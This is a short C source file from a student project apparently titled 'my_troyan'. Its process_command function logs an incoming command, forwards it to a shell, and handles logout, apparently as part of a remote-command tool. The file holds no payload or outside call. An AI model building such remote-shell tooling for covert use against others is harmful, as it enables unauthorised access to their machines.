/*
** EPITECH PROJECT, 2021
** HUB_my_troyan
** File description:
** 18/04/2021 process_command.c
*/

#include "app.h"

int process_command(const char *command, server_t *server, shell_t *shell)
{
    write_in_log(3, "Exec: ", command, "\n");
    send_shell_command(shell, command);
    if (is_logout_command(command)) {
        logout_user(server);
    }
    return EXIT_SUCCESS;
}